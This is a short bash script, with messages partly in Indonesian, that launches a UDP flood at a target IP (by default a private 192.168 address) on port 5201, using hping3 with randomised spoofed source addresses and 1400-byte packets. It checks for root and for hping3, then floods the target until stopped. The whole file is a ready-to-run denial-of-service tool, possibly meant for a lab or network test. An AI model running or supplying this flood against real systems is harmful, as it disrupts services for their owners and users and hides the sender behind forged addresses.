#!/bin/bash
# UDP Flood Attack on port 5201 with large packets

TARGET_IP="${1:-192.168.18.20}"

echo "=========================================="
echo "   UDP FLOOD ATTACK to port 5201"
echo "=========================================="
echo "Target: $TARGET_IP"
echo "Using: hping3 --udp --flood --rand-source -p 5201 --data 1400 $TARGET_IP"
echo ""
echo "Tekan Ctrl+C untuk menghentikan serangan"
echo "=========================================="
echo ""

if ! command -v hping3 &> /dev/null; then
    echo "ERROR: hping3 tidak terinstal!"
    exit 1
fi

if [ "$EUID" -ne 0 ]; then
    echo "ERROR: Jalankan dengan sudo!"
    exit 1
fi

# CRITICAL!! -p 5201 --data 1400
echo "Memulai UDP flood ke $TARGET_IP pada port 5201 packet size 1400 bytes ..."
hping3 --udp --flood --rand-source -p 5201 --data 1400 "$TARGET_IP"
